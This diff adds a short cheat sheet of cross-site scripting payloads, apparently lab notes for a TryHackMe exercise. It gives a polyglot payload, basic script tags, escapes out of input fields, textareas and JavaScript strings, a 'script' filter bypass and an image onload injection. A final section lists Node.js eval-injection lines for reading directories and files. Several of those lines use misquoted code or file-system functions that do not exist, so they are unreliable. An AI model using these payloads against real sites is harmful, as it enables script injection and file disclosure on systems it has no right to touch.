@@ -1,0 +1,39 @@
+JS Polyglot 
+----------
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+
+
+Basic
+------
+<script>alert('THM');</script>
+
+Escape input value
+-------------------
+"><script>alert('THM');</script>
+
+Escape text area
+----------------
+</textarea><script>alert('THM');</script>
+
+Escape JS script
+----------------
+';alert('THM');//
+
+filter removes "script"
+-----------------------
+<sscriptcript>alert('THM');</sscriptcript>
+
+image tag onload event
+----------------------
+/images/cat.jpg" onload="alert('THM');
+
+
+JS command injection
+--------------------
+eval() function exploits
+	
+	process.cwd()
+	require('fs).getdir('.').toString()
+	require('fs').getdirSync('.')
+	require('fs').getFile('/path/to/filename', 'utf8')
+	require('fs').getFileSync('/path/to/filename', 'utf8').toString()
